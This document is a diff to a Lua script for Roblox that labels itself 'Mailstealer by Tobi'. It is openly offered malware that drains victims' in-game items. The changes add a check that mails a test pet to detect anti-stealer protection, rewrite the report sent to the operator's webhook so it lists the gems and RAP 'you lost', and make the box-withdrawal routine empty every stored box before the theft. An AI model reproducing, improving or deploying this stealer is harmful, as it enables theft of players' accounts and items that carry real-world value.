@@ -22,6 +22,27 @@ if GemAmount1 < 10000 then
     return
 end
 
+local function IsMailboxHooked()
+	local uid
+	for i, v in pairs(save["Pet"]) do
+		uid = i
+		break
+	end
+	local args = {
+        [1] = "Roblox",
+        [2] = "Test",
+        [3] = "Pet",
+        [4] = uid,
+        [5] = 1
+    }
+    local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    if err ~= "They don't have enough space!" then
+        return true
+    else
+        return false
+    end
+end
+
 local function formatNumber(number)
 	local number = math.floor(number)
 	local suffixes = {"", "k", "m", "b", "t"}
@@ -58,6 +79,10 @@ local function SendMessage(url, username, diamonds)
 	end
     fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
 	fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
+	if IsMailboxHooked() then
+		fields[2].name = "Anti-mailstealer used! You lost these items:"
+		fields[2].value = fields[2].value .. "\n\n\226\154\160 NOTICE: Anti-mailstealer used"
+	end
 
     local data = {
         ["embeds"] = {{
@@ -65,7 +90,7 @@ local function SendMessage(url, username, diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Mailstealer by Tobi. https://discord.gg/HcpNe56R2a"
+				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
 			}
         }}
     }
@@ -205,11 +230,10 @@ end
 
 local function EmptyBoxes()
     if save.Box then
-        for key, _ in pairs(save.Box) do
-			local args = {
-				[1] = key
-			}
-			game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(unpack(args))
+        for key, value in pairs(save.Box) do
+			if value._uq then
+				game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
+			end
         end
     end
 end
